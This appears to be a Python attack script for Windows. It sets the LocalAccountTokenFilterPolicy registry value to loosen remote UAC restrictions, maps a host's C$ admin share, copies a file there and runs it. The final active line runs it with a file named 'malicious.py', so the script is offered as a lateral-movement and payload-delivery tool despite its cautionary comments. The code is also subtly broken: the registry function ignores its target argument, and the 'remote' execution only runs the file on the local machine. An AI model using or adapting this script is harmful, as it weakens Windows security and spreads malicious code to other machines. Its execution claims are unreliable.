import os
import winreg
import shutil

def enable_admin_share(computer_name):
    try:
        regpath = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
        winreg.SetValueEx(key, "LocalAccountTokenFilterPolicy", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)
        print("Admin share enabled. A reboot is required for changes to take effect.")
    except Exception as e:
        print(f"Error enabling admin share: {e}")

def access_admin_share(computer_name, executable):
    try:
        remote = r"\\{}\c$".format(computer_name)
        local = "Z:"
        remote_file = os.path.join(local, executable)
        
        # Map network drive
        os.system(f"net use {local} {remote}")
        
        # Move file
        shutil.move(executable, remote_file)
        
        # Execute file remotely (use with caution)
        os.system(f"python {remote_file}")
        
        # Unmap network drive
        os.system(f"net use {local} /delete")
    except Exception as e:
        print(f"Error accessing admin share: {e}")

# Example usage (Make sure you have proper permissions and intent):
# enable_admin_share(os.environ["COMPUTERNAME"])
access_admin_share(os.environ["COMPUTERNAME"], "malicious.py")